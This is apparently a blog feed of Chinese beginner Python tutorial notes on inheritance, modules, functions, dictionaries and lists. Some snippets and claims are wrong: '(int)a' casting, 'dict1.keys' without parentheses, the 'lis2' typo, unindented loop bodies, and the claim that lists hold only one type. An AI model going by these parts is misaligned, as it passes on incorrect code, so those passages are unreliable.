class="title">sleep</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.name+<span class="string">&quot;在睡觉&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>因为python是多继承，所以使用super()需要参数表示哪个使用哪个父类</p><ul><li>第一个参数代表当前类</li><li>第二个参数self代表实例</li><li>意思就是根据实例去找类的父类，不同的实例就会有不同的父类</li><li>使用super只会调用第一个父类</li><li>在python3中支持super()的写法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span>(<span class="params">Animal</span>):</span></span><br><span class="line">    <span class="comment"># 调用父类的构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Cat,self).__init__(name,age)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">catch</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.name+<span class="string">&quot;在抓老鼠&quot;</span>)</span><br><span class="line">        </span><br><span class="line">cat1 = Cat(<span class="string">&quot;xiaobai&quot;</span>,<span class="number">1</span>)</span><br><span class="line">cat1.catch()</span><br></pre></td></tr></table></figure><h2 id="方法重写和实例属性"><a href="#方法重写和实例属性" class="headerlink" title="方法重写和实例属性"></a>方法重写和实例属性</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age  = age</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sleep</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.name+<span class="string">&quot;在睡觉&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span>(<span class="params">Animal</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age,hair_color</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(name,age)</span><br><span class="line">        <span class="comment"># 实例类作为猫的属性，方便管理</span></span><br><span class="line">        self.hair_color = Body(hair_color)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">catch</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.name+<span class="string">&quot;在抓老鼠&quot;</span>)</span><br><span class="line">    <span class="comment"># 重写</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sleep</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.name+<span class="string">&quot;趴着睡觉&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,hair_color</span>):</span></span><br><span class="line">        self.hair_color = hair_color</span><br><span class="line"></span><br><span class="line">cat1 = Cat(<span class="string">&quot;xiaobai&quot;</span>,<span class="number">1</span>,<span class="string">&quot;white&quot;</span>)</span><br><span class="line">cat1.catch()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用模块简化代码</title>
      <link href="/Programming/Python/mode.html"/>
      <url>/Programming/Python/mode.html</url>
      
        <content type="html"><![CDATA[<p> 二次利用</p><span id="more"></span><h2 id="引入模块"><a href="#引入模块" class="headerlink" title="引入模块"></a>引入模块</h2><p>会导入所有方法</p><p>只能引入当前目录的模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引入所有方法</span></span><br><span class="line"><span class="keyword">import</span> moduleName</span><br><span class="line"><span class="comment"># 使用方法</span></span><br><span class="line">moduleName.method1()</span><br><span class="line"><span class="comment"># 引入所有方法</span></span><br><span class="line"><span class="keyword">from</span> moduleName <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">method1()</span><br></pre></td></tr></table></figure><h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> moduleName <span class="keyword">as</span> new_name</span><br></pre></td></tr></table></figure><h2 id="引入模块的方法"><a href="#引入模块的方法" class="headerlink" title="引入模块的方法"></a>引入模块的方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> module <span class="keyword">import</span> method1,method2</span><br></pre></td></tr></table></figure><h3 id="别名-1"><a href="#别名-1" class="headerlink" title="别名"></a>别名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> module <span class="keyword">import</span> method1 <span class="keyword">as</span> m1,method2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模块 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单使用方法</title>
      <link href="/Programming/Python/method.html"/>
      <url>/Programming/Python/method.html</url>
      
        <content type="html"><![CDATA[<p> 就是函数</p><span id="more"></span><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">funName</span>(<span class="params">p1,p2</span>):</span></span><br><span class="line">funBody</span><br><span class="line">    <span class="keyword">return</span>  </span><br></pre></td></tr></table></figure><p>没有返回值时返回<code>None</code></p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p><strong>位置参数</strong></p><ul><li>定义了方法的参数，然后使用方法按照位置填入参数</li></ul><p><strong>关键字参数</strong></p><ul><li>指定<code>参数名=值</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>,sep=<span class="string">&quot;-&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>默认值</strong></p><p>在定义参数时可以指定默认值</p><p>设定默认值的参数必须放在后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">a,b=<span class="number">2</span></span>):</span></span><br><span class="line">funbody</span><br></pre></td></tr></table></figure><p><strong>可变参数</strong></p><p>可变参数必须放在最后一个</p><p>输入的数据会被包装成<strong>元组</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">a,*n</span>):</span></span><br><span class="line"><span class="comment"># 可变的参数会被包装成元组，可以遍历它</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n :</span><br><span class="line"><span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解字典、列表</title>
      <link href="/Programming/Python/dict.html"/>
      <url>/Programming/Python/dict.html</url>
      
        <content type="html"><![CDATA[<p>字典类似列表，列表使用’’索引-数据”的形式存储数据，字典使用键值对的形式存储数据</p><p>列表只能存储一种数据类型，而且索引固定</p><p>字典的“键”和“值”可以是任意类型，这里的“键”相当于列表的索引</p><p>列表在内存的数据是有序的，字典是无序的</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建字典</span></span><br><span class="line">stu1 = &#123; <span class="string">&quot;name&quot;</span>:<span class="string">&quot;manu&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">19</span>,<span class="string">&quot;gender&quot;</span>:<span class="string">&quot;male&quot;</span> &#125;</span><br><span class="line"><span class="comment"># 添加</span></span><br><span class="line">stu1[<span class="string">&quot;hobby&quot;</span>]  = <span class="string">&quot;coding&quot;</span></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line"><span class="built_in">print</span>(stu1[<span class="string">&quot;name&quot;</span>])</span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">stu1[<span class="string">&quot;age&quot;</span>] = <span class="number">20</span></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line"><span class="keyword">del</span> stu1[<span class="string">&quot;gender&quot;</span>]</span><br></pre></td></tr></table></figure><h2 id="字典与列表的嵌套"><a href="#字典与列表的嵌套" class="headerlink" title="字典与列表的嵌套"></a>字典与列表的嵌套</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个存储所有学生的列表，里面包含学生的各种信息</span></span><br><span class="line">stu = [&#123; <span class="string">&quot;name&quot;</span>:<span class="string">&quot;manu&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">19</span>,<span class="string">&quot;gender&quot;</span>:<span class="string">&quot;male&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="string">&quot;name&quot;</span>:<span class="string">&quot;manu&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">19</span>,<span class="string">&quot;gender&quot;</span>:<span class="string">&quot;male&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="string">&quot;name&quot;</span>:<span class="string">&quot;后排&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">19</span>,<span class="string">&quot;gender&quot;</span>:<span class="string">&quot;male&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="string">&quot;name&quot;</span>:<span class="string">&quot;sb1号&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">19</span>,<span class="string">&quot;gender&quot;</span>:<span class="string">&quot;male&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="string">&quot;name&quot;</span>:<span class="string">&quot;sb2号&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">19</span>,<span class="string">&quot;gender&quot;</span>:<span class="string">&quot;male&quot;</span> &#125;]</span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line"><span class="built_in">print</span>(stu[<span class="number">2</span>][<span class="string">&quot;name&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典里面嵌套列表</span></span><br><span class="line">stu2 = &#123; <span class="string">&quot;name&quot;</span>:<span class="string">&quot;manu&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>:<span class="number">19</span>,<span class="string">&quot;gender&quot;</span>:<span class="string">&quot;male&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hobby&quot;</span>:[<span class="string">&quot;programing&quot;</span>,<span class="string">&quot;coding&quot;</span>]&#125;</span><br><span class="line"><span class="built_in">print</span>(stu2[<span class="string">&quot;hobby&quot;</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="判断是否相等"><a href="#判断是否相等" class="headerlink" title="判断是否相等"></a>判断是否相等</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d1 == d2</span><br><span class="line"><span class="comment"># 等于返回True</span></span><br></pre></td></tr></table></figure><ul><li>列表是有顺序的，判断时顺序不对也就不相等</li><li>字典是无序的，键和值对等则就相等</li></ul><h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><h3 id="键"><a href="#键" class="headerlink" title="键"></a>键</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># m1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dict1.keys():</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># m2</span></span><br><span class="line"><span class="built_in">print</span>(dict1.keys)</span><br><span class="line"><span class="comment"># m3 </span></span><br><span class="line">keys = <span class="built_in">list</span>(dict1.keys)</span><br><span class="line"><span class="built_in">print</span>(keys)</span><br></pre></td></tr></table></figure><h3 id="值"><a href="#值" class="headerlink" title="值"></a>值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># m1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dict1.values():</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># m2</span></span><br><span class="line"><span class="built_in">print</span>(dict1.values)</span><br><span class="line"><span class="comment"># m3 </span></span><br><span class="line">values = <span class="built_in">list</span>(dict1.values)</span><br><span class="line"><span class="built_in">print</span>(values)</span><br></pre></td></tr></table></figure><h3 id="键值对"><a href="#键值对" class="headerlink" title="键值对"></a>键值对</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># m1 通过items返回的是一个元组)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dict1.items():</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># 单独访问键与值</span></span><br><span class="line"><span class="built_in">print</span>(i[<span class="number">0</span>],i[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># m2 </span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> dict1.items():</span><br><span class="line"><span class="comment"># 单独访问键与值</span></span><br><span class="line"><span class="built_in">print</span>(k,v)</span><br></pre></td></tr></table></figure><h3 id="判断是否存在"><a href="#判断是否存在" class="headerlink" title="判断是否存在"></a>判断是否存在</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断是否存在值，返回布尔值</span></span><br><span class="line"><span class="string">&quot;test&quot;</span> <span class="keyword">in</span> dict1.values()</span><br><span class="line"><span class="comment"># 判断是否存在键，返回布尔值</span></span><br><span class="line"><span class="string">&quot;test&quot;</span> <span class="keyword">in</span> dict1.keys()</span><br><span class="line"><span class="comment"># 默认判断键</span></span><br><span class="line"><span class="string">&quot;test&quot;</span> <span class="keyword">in</span> dict1</span><br></pre></td></tr></table></figure><h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h3><p>一般情况下使用字典都不会知道里面的数据，可以设置一个默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当key存在则使用它的值，不存在则使用默认值</span></span><br><span class="line">dict1.setdefault(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字典 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础</title>
      <link href="/Programming/Python/Py-base.html"/>
      <url>/Programming/Python/Py-base.html</url>
      
        <content type="html"><![CDATA[<p>Python是一种跨平台的<a href="https://baike.baidu.com/item/计算机程序设计语言/7073760">计算机程序设计语言</a>。 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。最初被设计用于编写自动化脚本(shell)，随着版本的不断更新和语言新功能的添加，越多被用于独立的、大型项目的开发。</p><span id="more"></span><p>适用范围</p><ul><li>Web 和 Internet开发</li><li>科学计算和统计</li><li>人工智能</li><li>桌面界面开发</li><li>软件开发</li><li>后端开发</li><li>网络爬虫</li></ul><h2 id="基础运算符"><a href="#基础运算符" class="headerlink" title="基础运算符"></a>基础运算符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">1</span> + <span class="number">2</span></span><br><span class="line">n2 = <span class="number">1</span> - <span class="number">3</span></span><br><span class="line">n3 = <span class="number">3</span> / <span class="number">2</span></span><br><span class="line"><span class="comment"># 取整</span></span><br><span class="line">n4 = <span class="number">3</span> // <span class="number">2</span></span><br><span class="line">n5 = <span class="number">3</span> * <span class="number">8</span></span><br><span class="line"><span class="comment"># 乘方</span></span><br><span class="line">n6 = <span class="number">3</span> ** <span class="number">4</span></span><br></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 组拼</span></span><br><span class="line">s1 = <span class="string">&quot;hello&quot;</span> + <span class="built_in">str</span>(<span class="number">23</span>)</span><br><span class="line"><span class="comment"># 复制3份</span></span><br><span class="line">s2 = <span class="string">&quot;hello&quot;</span> * <span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># 不换行</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;world&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 等待输入，返回的是字符串</span></span><br><span class="line">a = <span class="built_in">input</span>()</span><br><span class="line"><span class="comment"># 转换类型</span></span><br><span class="line">a = (<span class="built_in">int</span>)a</span><br></pre></td></tr></table></figure><h2 id="python之禅"><a href="#python之禅" class="headerlink" title="python之禅"></a>python之禅</h2><p>在python终端输入<code>import this</code>会出现英文诗，是python的彩蛋，是一段编程思想，代表python的语言规范，给我印象最深的是那句“如果你无法向别人描述你的方案，那肯定不是一个好的方案，反之亦然”</p><blockquote><p><a href="https://blog.csdn.net/gzlaiyonghao/article/details/2151918">关于python之禅</a></p></blockquote><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a><strong>列表</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = []</span><br><span class="line">list1 = [ <span class="number">12</span>,<span class="number">23</span>,<span class="number">412</span>,<span class="number">312</span>,<span class="number">42</span> ]</span><br><span class="line"><span class="comment"># 访问整个列表</span></span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="comment"># 访问单个数据,索引从0开始</span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 访问倒数第3个元素</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">3</span>])</span><br><span class="line"><span class="comment"># 访问子列表,不包括结束索引</span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line"><span class="comment"># print(list1[:2])默认从头部开始</span></span><br><span class="line"><span class="comment"># print(list1[2:])截取到尾部</span></span><br><span class="line"><span class="comment"># print(list1[:])==list1</span></span><br><span class="line">list2 = [ <span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>]</span><br><span class="line"><span class="comment"># 添加数据</span></span><br><span class="line">list2.append(<span class="string">&quot;test&quot;</span>)</span><br><span class="line"><span class="comment"># 插入数据</span></span><br><span class="line">list2.insert(<span class="number">0</span>,<span class="string">&quot;test2&quot;</span>)</span><br><span class="line"><span class="comment"># 通过索引删除数据</span></span><br><span class="line"><span class="keyword">del</span>(list2[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">del</span> list2[<span class="number">2</span>] </span><br><span class="line"><span class="comment"># 通过值删除数据</span></span><br><span class="line">list2.remove(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># 获取索引</span></span><br><span class="line">lis2.index(<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list2.pop(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 返回list[2]的值，并且删掉它</span></span><br></pre></td></tr></table></figure><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sort，会修改原数据</span></span><br><span class="line"><span class="comment"># 字母a-z</span></span><br><span class="line"><span class="comment"># 数字1-9</span></span><br><span class="line"><span class="comment"># 可以使用传递reverse=True改变排序方式</span></span><br><span class="line">list2.sort()</span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"><span class="comment"># 不改变源数据</span></span><br><span class="line">newList = <span class="built_in">sorted</span>(list1)</span><br><span class="line"><span class="comment"># 单纯翻转数据</span></span><br><span class="line">list1.reverse()</span><br></pre></td></tr></table></figure><h3 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取列表长度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list1))</span><br></pre></td></tr></table></figure><h3 id="多维列表"><a href="#多维列表" class="headerlink" title="多维列表"></a>多维列表</h3><p>指列表里面还是列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义</span></span><br><span class="line">l1 = [ [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>],[<span class="number">9</span>,<span class="number">0</span>] ]</span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line"><span class="built_in">print</span>(l1[<span class="number">0</span>][<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>三维，四维都可以</p><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><ul><li>直接遍历数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for循环，注意冒号</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l1:</span><br><span class="line">    <span class="comment"># 缩进的表示循环体</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># 没缩进的就是单独的语句</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;test&quot;</span>)</span><br></pre></td></tr></table></figure><p>​    python对缩进，空格有严格的要求</p><ul><li>规律列表</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不包含结束</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">10</span>)))</span><br><span class="line"><span class="comment"># 可以设置补长，默认1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">10</span>,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><ul><li>通过遍历索引来遍历数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">10</span>,<span class="number">2</span>))</span><br><span class="line"><span class="comment"># 代表2-10步进为2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(list1)):</span><br><span class="line">    <span class="built_in">print</span>(list1[i])</span><br></pre></td></tr></table></figure><ul><li>遍历加处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    list2.append(i**<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;list2:&quot;</span>+<span class="built_in">str</span>(list2))</span><br><span class="line"><span class="comment"># 简写</span></span><br><span class="line">list3 = [ i**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;list3:&quot;</span>+<span class="built_in">str</span>(list3))</span><br></pre></td></tr></table></figure><h3 id="简单处理数字"><a href="#简单处理数字" class="headerlink" title="简单处理数字"></a>简单处理数字</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">min</span>(list1)</span><br><span class="line"><span class="built_in">max</span>(list1)</span><br><span class="line"><span class="built_in">sum</span>(list1)</span><br></pre></td></tr></table></figure><h3 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h3><figure class="highlight python"><table><tr><td 